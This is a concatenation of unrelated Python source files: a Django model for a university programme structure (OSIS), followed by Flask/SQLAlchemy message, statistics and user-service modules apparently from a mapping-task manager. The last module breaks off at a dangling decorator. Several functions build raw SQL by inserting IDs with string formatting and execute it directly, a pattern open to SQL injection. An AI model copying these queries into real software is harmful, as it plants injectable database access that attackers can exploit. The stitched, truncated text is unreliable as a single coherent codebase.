##############################################################################
#
#    OSIS stands for Open Student Information System. It's an application
#    designed to manage the core business of higher education institutions,
#    such as universities, faculties, institutes and professional schools.
#    The core business involves the administration of students, teachers,
#    courses, programs and so on.
#
#    Copyright (C) 2015-2018 Universit√© catholique de Louvain (http://www.uclouvain.be)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    A copy of this license - GNU General Public License - is available
#    at the root of the source code of this program.  If not,
#    see http://www.gnu.org/licenses/.
#
##############################################################################
import itertools

from django.core.exceptions import ValidationError
from django.db import models, connection
from django.db.models import Q, F, Case, When
from django.utils import translation
from django.utils.functional import cached_property
from django.utils.translation import ugettext_lazy as _
from ordered_model.models import OrderedModel
from reversion.admin import VersionAdmin

from backoffice.settings.base import LANGUAGE_CODE_EN
from base.models import education_group_type, education_group_year
from base.models.education_group_type import GROUP_TYPE_OPTION
from base.models.education_group_year import EducationGroupYear
from base.models.enums import education_group_categories, link_type, quadrimesters
from base.models.enums.link_type import LinkTypes
from base.models.learning_component_year import LearningComponentYear, volume_total_verbose
from base.models.learning_unit_year import LearningUnitYear
from osis_common.models.osis_model_admin import OsisModelAdmin


class GroupElementYearAdmin(VersionAdmin, OsisModelAdmin):
    list_display = ('parent', 'child_branch', 'child_leaf',)
    readonly_fields = ('order',)
    search_fields = [
        'child_branch__acronym',
        'child_branch__partial_acronym',
        'child_leaf__acronym',
        'parent__acronym',
        'parent__partial_acronym'
    ]
    list_filter = ('is_mandatory', 'access_condition', 'quadrimester_derogation', 'parent__academic_year')


SQL_RECURSIVE_QUERY_EDUCATION_GROUP = """\
WITH RECURSIVE group_element_year_parent AS (

    SELECT id, child_branch_id, child_leaf_id, parent_id, 0 AS level
    FROM base_groupelementyear
    WHERE parent_id IN ({list_root_ids})                    

    UNION ALL

    SELECT child.id,
           child.child_branch_id,
           child.child_leaf_id,
           child.parent_id,
           parent.level + 1

    FROM base_groupelementyear AS child
    INNER JOIN group_element_year_parent AS parent on parent.child_branch_id = child.parent_id

    )

SELECT * FROM group_element_year_parent ;
"""


class GroupElementYearManager(models.Manager):
    def get_queryset(self):
        return super().get_queryset().filter(
            Q(child_branch__isnull=False) | Q(child_leaf__learning_container_year__isnull=False)
        )


class GroupElementYear(OrderedModel):
    external_id = models.CharField(max_length=100, blank=True, null=True, db_index=True)
    changed = models.DateTimeField(null=True, auto_now=True)

    parent = models.ForeignKey(
        EducationGroupYear,
        null=True,  # TODO: can not be null, dirty data
        on_delete=models.PROTECT,
    )

    child_branch = models.ForeignKey(
        EducationGroupYear,
        related_name='child_branch',  # TODO: can not be child_branch
        blank=True, null=True,
        on_delete=models.CASCADE,
    )

    child_leaf = models.ForeignKey(
        LearningUnitYear,
        related_name='child_leaf',  # TODO: can not be child_leaf
        blank=True, null=True,
        on_delete=models.CASCADE,
    )

    relative_credits = models.IntegerField(
        blank=True,
        null=True,
        verbose_name=_("relative credits"),
    )

    min_credits = models.IntegerField(
        blank=True,
        null=True,
        verbose_name=_("Min. credits"),
    )

    max_credits = models.IntegerField(
        blank=True,
        null=True,
        verbose_name=_("Max. credits"),
    )

    is_mandatory = models.BooleanField(
        default=False,
        verbose_name=_("Mandatory"),
    )

    block = models.CharField(
        max_length=7,
        blank=True,
        null=True,
        verbose_name=_("Block")
    )

    access_condition = models.BooleanField(
        default=False,
        verbose_name=_('Access condition')
    )

    comment = models.TextField(
        max_length=500,
        blank=True, null=True,
        verbose_name=_("comment"),
    )
    comment_english = models.TextField(
        max_length=500,
        blank=True, null=True,
        verbose_name=_("english comment"),
    )

    own_comment = models.CharField(max_length=500, blank=True, null=True)

    quadrimester_derogation = models.CharField(
        max_length=10,
        choices=quadrimesters.DEROGATION_QUADRIMESTERS,
        blank=True, null=True, verbose_name=_('Quadrimester derogation')
    )

    link_type = models.CharField(
        max_length=25,
        choices=LinkTypes.choices(),
        blank=True, null=True, verbose_name=_('Link type')
    )

    order_with_respect_to = 'parent'

    objects = GroupElementYearManager()

    def __str__(self):
        return "{} - {}".format(self.parent, self.child)

    @property
    def verbose(self):
        if self.child_branch:
            return "{} ({} {})".format(
                self.child.title, self.relative_credits or self.child_branch.credits or 0, _("credits")
            )

        else:
            components = LearningComponentYear.objects.filter(
                learningunitcomponent__learning_unit_year=self.child_leaf).annotate(
                total=Case(When(hourly_volume_total_annual=None, then=0),
                           default=F('hourly_volume_total_annual'))).values('type', 'total')

            return "{} {} [{}] ({} {})".format(
                self.child_leaf.acronym,
                self.child.complete_title_english
                if self.child.complete_title_english and translation.get_language() == 'en'
                else self.child.complete_title,
                volume_total_verbose(components),
                self.relative_credits or self.child_leaf.credits or 0,
                _("credits"),
            )

    @property
    def verbose_comment(self):
        if self.comment_english and translation.get_language() == LANGUAGE_CODE_EN:
            return self.comment_english
        return self.comment

    class Meta:
        ordering = ('order',)

    def save(self, force_insert=False, force_update=False, using=None, update_fields=None):
        self.clean()
        return super().save(force_insert, force_update, using, update_fields)

    def clean(self):
        if self.child_branch and self.child_leaf:
            raise ValidationError(_("It is forbidden to save a GroupElementYear with a child branch and a child leaf."))

        if self.child_branch == self.parent:
            raise ValidationError(_("It is forbidden to attach an element to itself."))

        if self.parent and self.child_branch in self.parent.ascendants_of_branch:
            raise ValidationError(_("It is forbidden to attach an element to one of its included elements."))

        if self.child_leaf and self.link_type == LinkTypes.REFERENCE.name:
            raise ValidationError(
                {'link_type': _("You are not allowed to create a reference with a learning unit")}
            )

    @cached_property
    def child(self):
        return self.child_branch or self.child_leaf

    def is_deletable(self):
        if self.child:
            return False
        return True


def search(**kwargs):
    queryset = GroupElementYear.objects

    if 'academic_year' in kwargs:
        academic_year = kwargs['academic_year']
        queryset = queryset.filter(Q(parent__academic_year=academic_year) |
                                   Q(child_branch__academic_year=academic_year) |
                                   Q(child_leaf__academic_year=academic_year))

    if 'child_leaf' in kwargs:
        queryset = queryset.filter(child_leaf=kwargs['child_leaf'])

    return queryset


def find_learning_unit_formations(objects, parents_as_instances=False):
    root_ids_by_object_id = {}
    if objects:
        filters = _get_root_filters()
        root_ids_by_object_id = _find_related_formations(objects, filters)
        if parents_as_instances:
            root_ids_by_object_id = _convert_parent_ids_to_instances(root_ids_by_object_id)
    return root_ids_by_object_id


def _get_root_filters():
    root_type_names = education_group_type.search(category=education_group_categories.MINI_TRAINING) \
        .exclude(name=GROUP_TYPE_OPTION).values_list('name', flat=True)
    root_categories = [education_group_categories.TRAINING]
    return {
        'parent__education_group_type__name': root_type_names,
        'parent__education_group_type__category': root_categories
    }


def _convert_parent_ids_to_instances(root_ids_by_object_id):
    flat_root_ids = list(set(itertools.chain.from_iterable(root_ids_by_object_id.values())))
    map_instance_by_id = {obj.id: obj for obj in education_group_year.search(id=flat_root_ids)}
    return {
        obj_id: sorted([map_instance_by_id[parent_id] for parent_id in parents], key=lambda obj: obj.acronym)
        for obj_id, parents in root_ids_by_object_id.items()
    }


def _raise_if_incorrect_instance(objects):
    first_obj = objects[0]
    obj_class = first_obj.__class__
    if obj_class not in [LearningUnitYear, EducationGroupYear]:
        raise AttributeError("Objects must be either LearningUnitYear or EducationGroupYear intances.")
    if any(obj for obj in objects if obj.__class__ != obj_class):
        raise AttributeError("All objects must be the same class instance ({})".format(obj_class))


def _find_related_formations(objects, filters):
    _raise_if_incorrect_instance(objects)
    academic_year = _extract_common_academic_year(objects)
    parents_by_id = _build_parent_list_by_education_group_year_id(academic_year, filters=filters)
    if isinstance(objects[0], LearningUnitYear):
        return {obj.id: _find_elements(parents_by_id, filters, child_leaf_id=obj.id) for obj in objects}
    else:
        return {obj.id: _find_elements(parents_by_id, filters, child_branch_id=obj.id) for obj in objects}


def _extract_common_academic_year(objects):
    if len(set(getattr(obj, 'academic_year_id') for obj in objects)) > 1:
        raise AttributeError("The algorithm should load only graph/structure for 1 academic_year "
                             "to avoid too large 'in-memory' data and performance issues.")
    return objects[0].academic_year


def _build_parent_list_by_education_group_year_id(academic_year, filters=None):
    columns_needed_for_filters = filters.keys() if filters else []
    group_elements = list(search(academic_year=academic_year)
                          .filter(parent__isnull=False)
                          .filter(Q(child_leaf__isnull=False) | Q(child_branch__isnull=False))
                          .select_related('education_group_year__education_group_type')
                          .values('parent', 'child_branch', 'child_leaf', *columns_needed_for_filters))
    result = {}
    # TODO :: uses .annotate() on queryset to make the below expected result
    for group_element_year in group_elements:
        key = _build_child_key(child_branch=group_element_year['child_branch'],
                               child_leaf=group_element_year['child_leaf'])
        result.setdefault(key, []).append(group_element_year)
    return result


def _build_child_key(child_branch=None, child_leaf=None):
    args = [child_leaf, child_branch]
    if not any(args) or all(args):
        raise AttributeError('Only one of the 2 param must bet set (not both of them).')
    if child_leaf:
        branch_part = 'child_leaf'
        id_part = child_leaf
    else:
        branch_part = 'child_branch'
        id_part = child_branch
    return '{branch_part}_{id_part}'.format(**locals())


def _find_elements(group_elements_by_child_id, filters, child_leaf_id=None, child_branch_id=None):
    roots = []
    unique_child_key = _build_child_key(child_leaf=child_leaf_id, child_branch=child_branch_id)
    group_elem_year_parents = group_elements_by_child_id.get(unique_child_key) or []
    for group_elem_year in group_elem_year_parents:
        parent_id = group_elem_year['parent']
        if filters and _match_any_filters(group_elem_year, filters):
            # If record matches any filter, we must stop mounting across the hierarchy.
            roots.append(parent_id)
        else:
            # Recursive call ; the parent_id becomes the child_branch.
            roots.extend(_find_elements(group_elements_by_child_id, filters, child_branch_id=parent_id))
    return list(set(roots))


def _match_any_filters(element_year, filters):
    return any(element_year[col_name] in values_list for col_name, values_list in filters.items())


def fetch_all_group_elements_in_tree(root: EducationGroupYear, queryset) -> dict:
    if queryset.model != GroupElementYear:
        raise AttributeError("The querySet arg has to be built from model {}".format(GroupElementYear))

    elements = _fetch_row_sql([root.id])

    distinct_group_elem_ids = {elem['id'] for elem in elements}
    queryset = queryset.filter(pk__in=distinct_group_elem_ids)

    group_elems_by_parent_id = {}  # Map {<EducationGroupYear.id>: [GroupElementYear, GroupElementYear...]}
    for group_elem_year in queryset:
        parent_id = group_elem_year.parent_id
        group_elems_by_parent_id.setdefault(parent_id, []).append(group_elem_year)
    return group_elems_by_parent_id


def _fetch_row_sql(root_ids):
    with connection.cursor() as cursor:
        query = SQL_RECURSIVE_QUERY_EDUCATION_GROUP.format(list_root_ids=','.join(str(root_id) for root_id in root_ids))                    
        cursor.execute(query)                    

        return [
            {
                'id': row[0],
                'child_branch_id': row[1],
                'child_leaf_id': row[2],
                'parent_id': row[3],
                'level': row[4],
            } for row in cursor.fetchall()
        ]


def get_or_create_group_element_year(parent, child_branch=None, child_leaf=None):
    if child_branch:
        return GroupElementYear.objects.get_or_create(parent=parent, child_branch=child_branch)
    elif child_leaf:
        return GroupElementYear.objects.get_or_create(parent=parent, child_leaf=child_leaf)
    return AttributeError('child branch OR child leaf params must be set')

from server import db
from flask import current_app
from enum import Enum
from server.models.dtos.message_dto import MessageDTO, MessagesDTO
from server.models.postgis.user import User
from server.models.postgis.task import Task
from server.models.postgis.project import Project
from server.models.postgis.utils import timestamp
from server.models.postgis.utils import NotFound

class MessageType(Enum):
    """ Describes the various kinds of messages a user might receive """
    SYSTEM = 1                     # Generic system-generated message
    BROADCAST = 2                  # Broadcast message from a project manager
    MENTION_NOTIFICATION = 3       # Notification that user was mentioned in a comment/chat
    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated
    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated

class Message(db.Model):
    """ Describes an individual Message a user can send """
    __tablename__ = "messages"

    __table_args__ = (
        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),
    )

    id = db.Column(db.Integer, primary_key=True)
    message = db.Column(db.String)
    subject = db.Column(db.String)
    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))
    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)
    task_id = db.Column(db.Integer, index=True)
    message_type = db.Column(db.Integer, index=True)
    date = db.Column(db.DateTime, default=timestamp)
    read = db.Column(db.Boolean, default=False)

    # Relationships
    from_user = db.relationship(User, foreign_keys=[from_user_id])
    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')
    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')
    task = db.relationship(Task, primaryjoin="and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)",
        backref='messages')

    @classmethod
    def from_dto(cls, to_user_id: int, dto: MessageDTO):
        """ Creates new message from DTO """
        message = cls()
        message.subject = dto.subject
        message.message = dto.message
        message.from_user_id = dto.from_user_id
        message.to_user_id = to_user_id
        message.project_id = dto.project_id
        message.task_id = dto.task_id
        if dto.message_type is not None:
            message.message_type = MessageType(dto.message_type)

        return message

    def as_dto(self) -> MessageDTO:
        """ Casts message object to DTO """
        dto = MessageDTO()
        dto.message_id = self.id
        dto.message = self.message
        dto.sent_date = self.date
        dto.read = self.read
        dto.subject = self.subject
        dto.project_id = self.project_id
        dto.task_id = self.task_id
        if self.message_type is not None:
            dto.message_type = MessageType(self.message_type).name

        if self.from_user_id:
            dto.from_username = self.from_user.username

        return dto

    def add_message(self):
        """ Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS"""
        current_app.logger.debug('Adding message to session')
        db.session.add(self)

    def save(self):
        """ Save """
        db.session.add(self)
        db.session.commit()

    @staticmethod
    def get_all_contributors(project_id: int):
        """ Get all contributors to a project """
        query = '''SELECT mapped_by as contributors from tasks where project_id = {0} and  mapped_by is not null                    
                   UNION
                   SELECT validated_by from tasks where tasks.project_id = {0} and validated_by is not null'''.format(project_id)                    

        contributors = db.engine.execute(query)                    
        return contributors

    def mark_as_read(self):
        """ Mark the message in scope as Read """
        self.read = True
        db.session.commit()

    @staticmethod
    def get_unread_message_count(user_id: int):
        """ Get count of unread messages for user """
        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()

    @staticmethod
    def get_all_messages(user_id: int) -> MessagesDTO:
        """ Gets all messages to the user """
        user_messages = Message.query.filter(Message.to_user_id == user_id).all()

        if len(user_messages) == 0:
            raise NotFound()

        messages_dto = MessagesDTO()
        for message in user_messages:
            messages_dto.user_messages.append(message.as_dto())

        return messages_dto

    @staticmethod
    def delete_multiple_messages(message_ids: list, user_id: int):
        """ Deletes the specified messages to the user """
        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\
                delete(synchronize_session=False)
        db.session.commit()

    def delete(self):
        """ Deletes the current model from the DB """
        db.session.delete(self)
        db.session.commit()


from cachetools import TTLCache, cached

from sqlalchemy import func, text
from server import db
from server.models.dtos.stats_dto import (
    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,
    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,
    CampaignStatsDTO
    )
from server.models.postgis.project import Project
from server.models.postgis.statuses import TaskStatus
from server.models.postgis.task import TaskHistory, User, Task
from server.models.postgis.utils import timestamp, NotFound
from server.services.project_service import ProjectService
from server.services.users.user_service import UserService


homepage_stats_cache = TTLCache(maxsize=4, ttl=30)


class StatsService:

    @staticmethod
    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,
                                             new_state: TaskStatus, action='change'):
        """ Update stats when a task has had a state change """

        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:
            return  # No stats to record for these states

        project = ProjectService.get_project_by_id(project_id)
        user = UserService.get_user_by_id(user_id)

        StatsService._update_tasks_stats(project, user, last_state, new_state, action)
        UserService.upsert_mapped_projects(user_id, project_id)
        project.last_updated = timestamp()

        # Transaction will be saved when task is saved
        return project, user

    @staticmethod
    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,
                            action='change'):

        # Make sure you are aware that users table has it as incrementing counters,
        # while projects table reflect the actual state, and both increment and decrement happens

        # Set counters for new state
        if new_state == TaskStatus.MAPPED:
            project.tasks_mapped += 1
        elif new_state == TaskStatus.VALIDATED:
            project.tasks_validated += 1
        elif new_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery += 1

        if action == 'change':
            if new_state == TaskStatus.MAPPED:
                user.tasks_mapped += 1
            elif new_state == TaskStatus.VALIDATED:
                user.tasks_validated += 1
            elif new_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated += 1

        # Remove counters for old state
        if last_state == TaskStatus.MAPPED:
            project.tasks_mapped -= 1
        elif last_state == TaskStatus.VALIDATED:
            project.tasks_validated -= 1
        elif last_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery -= 1

        if action == 'undo':
            if last_state == TaskStatus.MAPPED:
                user.tasks_mapped -= 1
            elif last_state == TaskStatus.VALIDATED:
                user.tasks_validated -= 1
            elif last_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated -= 1

    @staticmethod
    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:
        """ Gets all the activity on a project """

        results = db.session.query(
                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,
                TaskHistory.action_text, User.username
            ).join(User).filter(
                TaskHistory.project_id == project_id,
                TaskHistory.action != 'COMMENT'
            ).order_by(
                TaskHistory.action_date.desc()
            ).paginate(page, 10, True)

        if results.total == 0:
            raise NotFound()

        activity_dto = ProjectActivityDTO()
        for item in results.items:
            history = TaskHistoryDTO()
            history.history_id = item.id
            history.task_id = item.task_id
            history.action = item.action
            history.action_text = item.action_text
            history.action_date = item.action_date
            history.action_by = item.username
            activity_dto.activity.append(history)

        activity_dto.pagination = Pagination(results)
        return activity_dto

    @staticmethod
    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:
        """ Get all user contributions on a project"""
        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated
                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped
                                     from tasks t,
                                          users u
                                    where t.mapped_by = u.id
                                      and t.project_id = {0}                    
                                      and t.mapped_by is not null
                                    group by t.mapped_by, u.username) m FULL OUTER JOIN
                                  (select t.validated_by, u.username, count(t.validated_by) validated
                                     from tasks t,
                                          users u
                                    where t.validated_by = u.id
                                      and t.project_id = {0}                    
                                      and t.validated_by is not null
                                    group by t.validated_by, u.username) v
                                       ON m.mapped_by = v.validated_by
        '''.format(project_id)                    

        results = db.engine.execute(contrib_query)                    
        if results.rowcount == 0:
            raise NotFound()

        contrib_dto = ProjectContributionsDTO()
        for row in results:
            user_id = row[0] or row[3]
            user_contrib = UserContribution()
            user_contrib.username = row[1] if row[1] else row[4]
            user_contrib.mapped = row[2] if row[2] else 0
            user_contrib.validated = row[5] if row[5] else 0
            contrib_dto.user_contributions.append(user_contrib)
        return contrib_dto

    @staticmethod
    @cached(homepage_stats_cache)
    def get_homepage_stats() -> HomePageStatsDTO:
        """ Get overall TM stats to give community a feel for progress that's being made """
        dto = HomePageStatsDTO()

        dto.total_projects = Project.query.count()
        dto.mappers_online = Task.query.filter(
            Task.locked_by is not None
            ).distinct(Task.locked_by).count()
        dto.total_mappers = User.query.count()
        dto.total_validators = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).distinct(Task.validated_by).count()
        dto.tasks_mapped = Task.query.filter(
            Task.task_status.in_(
                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)
                )
            ).count()
        dto.tasks_validated = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).count()

        org_proj_count = db.session.query(
            Project.organisation_tag,
            func.count(Project.organisation_tag)
        ).group_by(Project.organisation_tag).all()

        untagged_count = 0

        # total_area = 0



       # dto.total_area = 0

        # total_area_sql = """select sum(ST_Area(geometry)) from public.projects as area"""

        # total_area_result = db.engine.execute(total_area_sql)
        # current_app.logger.debug(total_area_result)
        # for rowproxy in total_area_result:
            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]
            # for tup in rowproxy.items():
                # total_area += tup[1]
                # current_app.logger.debug(total_area)
        # dto.total_area = total_area

        tasks_mapped_sql = "select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status"
        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)

        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']

        tasks_validated_sql = "select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status"
        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)

        dto.total_validated_area = tasks_validated_result.fetchone()['sum']

        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\
            .group_by(Project.campaign_tag).all()
        no_campaign_count = 0
        unique_campaigns = 0

        for tup in campaign_count:
            campaign_stats = CampaignStatsDTO(tup)
            if campaign_stats.tag:
                dto.campaigns.append(campaign_stats)
                unique_campaigns += 1
            else:
                no_campaign_count += campaign_stats.projects_created

        if no_campaign_count:
            no_campaign_proj = CampaignStatsDTO(('Untagged', no_campaign_count))
            dto.campaigns.append(no_campaign_proj)
        dto.total_campaigns = unique_campaigns

        org_proj_count = db.session.query(Project.organisation_tag, func.count(Project.organisation_tag))\
            .group_by(Project.organisation_tag).all()
        no_org_count = 0
        unique_orgs = 0

        for tup in org_proj_count:
            org_stats = OrganizationStatsDTO(tup)
            if org_stats.tag:
                dto.organizations.append(org_stats)
                unique_orgs += 1
            else:
                no_org_count += org_stats.projects_created

        if no_org_count:
            no_org_proj = OrganizationStatsDTO(('Untagged', no_org_count))
            dto.organizations.append(no_org_proj)
        dto.total_organizations = unique_orgs

        return dto

from cachetools import TTLCache, cached
from flask import current_app
from functools import reduce
import dateutil.parser
import datetime

from server import db
from server.models.dtos.user_dto import UserDTO, UserOSMDTO, UserFilterDTO, UserSearchQuery, UserSearchDTO, \
    UserStatsDTO
from server.models.dtos.message_dto import MessageDTO
from server.models.postgis.message import Message
from server.models.postgis.task import TaskHistory
from server.models.postgis.user import User, UserRole, MappingLevel
from server.models.postgis.utils import NotFound
from server.services.users.osm_service import OSMService, OSMServiceError
from server.services.messaging.smtp_service import SMTPService
from server.services.messaging.template_service import get_template

user_filter_cache = TTLCache(maxsize=1024, ttl=600)
user_all_cache = TTLCache(maxsize=1024, ttl=600)


class UserServiceError(Exception):
    """ Custom Exception to notify callers an error occurred when in the User Service """

    def __init__(self, message):
        if current_app:
            current_app.logger.error(message)


class UserService:
    @staticmethod
    def get_user_by_id(user_id: int) -> User:
        user = User().get_by_id(user_id)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def get_user_by_username(username: str) -> User:
        user = User().get_by_username(username)

        if user is None:
            raise NotFound()

        return user

    @staticmethod
    def update_username(user_id: int, osm_username: str) -> User:
        user = UserService.get_user_by_id(user_id)
        if user.username != osm_username:
            user.update_username(osm_username)

        return user

    @staticmethod
    def register_user(osm_id, username, changeset_count):
        """
        Creates user in DB
        :param osm_id: Unique OSM user id
        :param username: OSM Username
        :param changeset_count: OSM changeset count
        """
        new_user = User()
        new_user.id = osm_id
        new_user.username = username

        intermediate_level = current_app.config['MAPPER_LEVEL_INTERMEDIATE']
        advanced_level = current_app.config['MAPPER_LEVEL_ADVANCED']

        if changeset_count > advanced_level:
            new_user.mapping_level = MappingLevel.ADVANCED.value
        elif intermediate_level < changeset_count < advanced_level:
            new_user.mapping_level = MappingLevel.INTERMEDIATE.value
        else:
            new_user.mapping_level = MappingLevel.BEGINNER.value

        new_user.create()
        return new_user

    @staticmethod
    def get_user_dto_by_username(requested_username: str, logged_in_user_id: int) -> UserDTO:
        """Gets user DTO for supplied username """
        requested_user = UserService.get_user_by_username(requested_username)
        logged_in_user = UserService.get_user_by_id(logged_in_user_id)
        UserService.check_and_update_mapper_level(requested_user.id)

        return requested_user.as_dto(logged_in_user.username)

    @staticmethod
    def get_user_dto_by_id(requested_user: int) -> UserDTO:
        """Gets user DTO for supplied user id """
        requested_user = UserService.get_user_by_id(requested_user)

        return requested_user.as_dto(requested_user.username)

    @staticmethod
    def get_detailed_stats(username: str):
        user = UserService.get_user_by_username(username)
        stats_dto = UserStatsDTO()

        actions = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text != ''
        ).all()

        tasks_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'MAPPED'
        ).count()
        tasks_validated = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action_text == 'VALIDATED'
        ).count()
        projects_mapped = TaskHistory.query.filter(
            TaskHistory.user_id == user.id,
            TaskHistory.action == 'STATE_CHANGE'
        ).distinct(TaskHistory.project_id).count()

        stats_dto.tasks_mapped = tasks_mapped
        stats_dto.tasks_validated = tasks_validated
        stats_dto.projects_mapped = projects_mapped
        stats_dto.total_time_spent = 0
        stats_dto.time_spent_mapping = 0
        stats_dto.time_spent_validating = 0

        sql = """SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_VALIDATION'
                and user_id = {0};""".format(user.id)                    
        total_validation_time = db.engine.execute(sql)                    
        for time in total_validation_time:
            total_validation_time = time[0]
            if total_validation_time:
                stats_dto.time_spent_validating = total_validation_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_validating

        sql = """SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_MAPPING'
                and user_id = {0};""".format(user.id)                    
        total_mapping_time = db.engine.execute(sql)                    
        for time in total_mapping_time:
            total_mapping_time = time[0]
            if total_mapping_time:
                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_mapping

        return stats_dto


    @staticmethod
    def update_user_details(user_id: int, user_dto: UserDTO) -> dict:
        """ Update user with info supplied by user, if they add or change their email address a verification mail
            will be sent """
        user = UserService.get_user_by_id(user_id)

        verification_email_sent = False
        if user_dto.email_address and user.email_address != user_dto.email_address.lower():
            # Send user verification email if they are adding or changing their email address
            SMTPService.send_verification_email(user_dto.email_address.lower(), user.username)
            user.set_email_verified_status(is_verified=False)
            verification_email_sent = True

        user.update(user_dto)
        return dict(verificationEmailSent=verification_email_sent)

    @staticmethod
    @cached(user_all_cache)
    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:
        """ Gets paginated list of users """
        return User.get_all_users(query)

    @staticmethod
    @cached(user_filter_cache)
    def filter_users(username: str, project_id: int, page: int) -> UserFilterDTO:
        """ Gets paginated list of users, filtered by username, for autocomplete """
        return User.filter_users(username, project_id, page)

    @staticmethod
    def is_user_a_project_manager(user_id: int) -> bool:
        """ Is the user a project manager """
        user = UserService.get_user_by_id(user_id)
        if UserRole(user.role) in [UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def get_mapping_level(user_id: int):
        """ Gets mapping level user is at"""
        user = UserService.get_user_by_id(user_id)

        return MappingLevel(user.mapping_level)

    @staticmethod
    def is_user_validator(user_id: int) -> bool:
        """ Determines if user is a validator """
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) in [UserRole.VALIDATOR, UserRole.ADMIN, UserRole.PROJECT_MANAGER]:
            return True

        return False

    @staticmethod
    def is_user_blocked(user_id: int) -> bool:
        """ Determines if a user is blocked """
        user = UserService.get_user_by_id(user_id)

        if UserRole(user.role) == UserRole.READ_ONLY:
            return True

        return False

    @staticmethod
    def upsert_mapped_projects(user_id: int, project_id: int):
        """ Add project to mapped projects if it doesn't exist, otherwise return """
        User.upsert_mapped_projects(user_id, project_id)

    @staticmethod
    def get_mapped_projects(user_name: str, preferred_locale: str):
        """ Gets all projects a user has mapped or validated on """
        user = UserService.get_user_by_username(user_name)
        return User.get_mapped_projects(user.id, preferred_locale)

    @staticmethod
    def add_role_to_user(admin_user_id: int, username: str, role: str):
        """
        Add role to user
        :param admin_user_id: ID of admin attempting to add the role
        :param username: Username of user the role should be added to
        :param role: The requested role
        :raises UserServiceError
        """
        try:
            requested_role = UserRole[role.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {role} accepted values are ADMIN, PROJECT_MANAGER, VALIDATOR')

        admin = UserService.get_user_by_id(admin_user_id)
        admin_role = UserRole(admin.role)

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.ADMIN:
            raise UserServiceError(f'You must be an Admin to assign Admin role')

        if admin_role == UserRole.PROJECT_MANAGER and requested_role == UserRole.PROJECT_MANAGER:
            raise UserServiceError(f'You must be an Admin to assign Project Manager role')

        user = UserService.get_user_by_username(username)
        user.set_user_role(requested_role)

    @staticmethod
    def set_user_mapping_level(username: str, level: str) -> User:
        """
        Sets the users mapping level
        :raises: UserServiceError
        """
        try:
            requested_level = MappingLevel[level.upper()]
        except KeyError:
            raise UserServiceError(f'Unknown role {level} accepted values are BEGINNER, INTERMEDIATE, ADVANCED')

        user = UserService.get_user_by_username(username)
        user.set_mapping_level(requested_level)

        return user

    @staticmethod
    def set_user_is_expert(user_id: int, is_expert: bool) -> User:
        """
        Enabled or disables expert mode for the user
        :raises: UserServiceError
        """
        user = UserService.get_user_by_id(user_id)
        user.set_is_expert(is_expert)

        return user

    @staticmethod
    def accept_license_terms(user_id: int, license_id: int):
        """ Saves the fact user has accepted license terms """
        user = UserService.get_user_by_id(user_id)
        user.accept_license_terms(license_id)

    @staticmethod
